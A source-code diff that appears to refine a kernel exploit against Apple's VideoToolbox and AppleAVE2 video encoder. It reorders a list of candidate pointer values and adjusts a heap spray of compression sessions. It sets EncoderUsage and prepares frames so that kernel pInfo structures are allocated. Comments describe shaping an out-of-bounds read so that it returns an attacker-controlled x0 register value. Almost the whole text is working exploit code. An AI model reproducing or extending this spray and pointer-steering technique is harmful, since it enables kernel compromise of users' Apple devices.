@@ -149,15 +149,12 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     // catches both direct stp x0,x0,[x0] writes and shaped OOB reads.
     uint64_t x0cands[8];
     int ncand = 0;
-    for (uint32_t hi = 0x10; hi <= 0x38; hi += 0x08) {
-        x0cands[ncand++] = ((uint64_t)(uint32_t)(0xFFFFFE00u + hi) << 32) | 0x59ULL;
-    }
-    BOOL hasSteered = NO;
-    for (int c = 0; c < ncand; c++) {
-        if (x0cands[c] == steeredX0) { hasSteered = YES; break; }
-    }
-    if (!hasSteered && ncand < 8) {
-        x0cands[ncand++] = steeredX0;
+    x0cands[ncand++] = steeredX0;
+    for (uint32_t hi = 0x10; hi <= 0x38 && ncand < 8; hi += 0x08) {
+        uint64_t cand = ((uint64_t)(uint32_t)(0xFFFFFE00u + hi) << 32) | 0x59ULL;
+        if (cand != steeredX0) {
+            x0cands[ncand++] = cand;
+        }
     }
     [report appendFormat:@"target NTL=%d steered_x0=0x%016llx\n", ntl, steeredX0];
     [report appendString:@"x0 candidates in spray:\n"];
@@ -191,20 +188,23 @@ static void SpriteDrain(VTCompressionSessionRef s, NSMutableArray *sink, int exp
     for (int i = 0; i < self.sprayCount; i++) {
         VTCompressionSessionRef s = [self makeSessionWidth:sw height:sh];
         if (!s) continue;
-        // two adjacent ints of the same marker build the u64 marker||marker
+        // Valid EncoderUsage=1 so H9VTEncoder/AppleAVE2 allocates the full temporal pInfo struct
+        VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@1);
+        // Two adjacent ints of the same marker build the u64 marker||marker
         VTSessionSetProperty(s, CFSTR("NumberOfTemporalLayers"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("ExpectedFrameRate"), (__bridge CFNumberRef)@(marker));
         VTSessionSetProperty(s, CFSTR("MaxKeyFrameIntervalDuration"), (__bridge CFNumberRef)@(marker));
-        VTSessionSetProperty(s, CFSTR("EncoderUsage"), (__bridge CFNumberRef)@(marker));
-        // every second sibling carries a full-width pointer candidate in the
+        // Every second sibling carries a full-width pointer candidate in the
         // 64-bit-capable int fields — the shaped read then returns OUR x0
         if ((i & 1) == 0) {
-            int64_t pv = (int64_t)x0cands[i % ncand];
+            int64_t pv = (int64_t)x0cands[(i >> 1) % ncand];
             VTSessionSetProperty(s, CFSTR("AverageBitRate"), (__bridge CFNumberRef)@(pv));
             VTSessionSetProperty(s, CFSTR("MaxKeyFrameInterval"), (__bridge CFNumberRef)@(pv));
         }
+        // Materialize the sibling context in AppleAVE2 kernel zone (pInfo)
+        VTCompressionSessionPrepareToEncodeFrames(s);
         [siblings addObject:[NSValue valueWithPointer:s]];
     }
     [self journal:[NSString stringWithFormat:@"SPRAY_DONE n=%d marker=0x%08x ntl=%d",
